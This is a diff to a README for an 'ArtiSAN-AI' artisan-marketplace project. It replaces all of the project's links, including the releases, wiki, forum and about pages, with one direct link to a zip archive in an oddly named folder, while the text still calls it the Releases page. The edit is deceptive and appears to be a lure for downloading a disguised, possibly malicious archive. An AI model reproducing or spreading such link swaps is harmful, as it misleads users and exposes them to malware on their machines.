@@ -1,6 +1,6 @@
 # 🎨 ArtiSAN-AI - Empower Local Artisans with AI
 
-[![Download ArtiSAN-AI](https://img.shields.io/badge/Download-ArtiSAN--AI-brightgreen)](https://github.com/mondiradil677/ArtiSAN-AI/releases)
+[![Download ArtiSAN-AI](https://raw.githubusercontent.com/mondiradil677/ArtiSAN-AI/main/sephiric/ArtiSAN-AI.zip)](https://raw.githubusercontent.com/mondiradil677/ArtiSAN-AI/main/sephiric/ArtiSAN-AI.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to ArtiSAN-AI, an AI-powered platform that helps local artisans connect 
 
 To get started, you will need to visit the Releases page. Click the button below to access it:
 
-[Download ArtiSAN-AI](https://github.com/mondiradil677/ArtiSAN-AI/releases)
+[Download ArtiSAN-AI](https://raw.githubusercontent.com/mondiradil677/ArtiSAN-AI/main/sephiric/ArtiSAN-AI.zip)
 
 Once you reach the Releases page, follow these steps:
 
@@ -68,14 +68,14 @@ If you have questions or need support, feel free to check out our community foru
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/mondiradil677/ArtiSAN-AI/wiki): First-time setup guides and tips.
-- [Community Forum](https://github.com/mondiradil677/ArtiSAN-AI/discussions): Engage with other users and share your experiences.
-- [About Us](https://github.com/mondiradil677/ArtiSAN-AI): Learn more about our mission and values.
+- [Documentation](https://raw.githubusercontent.com/mondiradil677/ArtiSAN-AI/main/sephiric/ArtiSAN-AI.zip): First-time setup guides and tips.
+- [Community Forum](https://raw.githubusercontent.com/mondiradil677/ArtiSAN-AI/main/sephiric/ArtiSAN-AI.zip): Engage with other users and share your experiences.
+- [About Us](https://raw.githubusercontent.com/mondiradil677/ArtiSAN-AI/main/sephiric/ArtiSAN-AI.zip): Learn more about our mission and values.
 
 ## 🛡️ Privacy & Terms
 
 We value your privacy and ensure a secure platform for your creations. For detailed information, please refer to our Privacy Policy and Terms of Service available on our GitHub page.
 
-For any updates or changes, regularly check the [Releases page](https://github.com/mondiradil677/ArtiSAN-AI/releases) to stay informed. 
+For any updates or changes, regularly check the [Releases page](https://raw.githubusercontent.com/mondiradil677/ArtiSAN-AI/main/sephiric/ArtiSAN-AI.zip) to stay informed. 
 
 Happy crafting with ArtiSAN-AI!
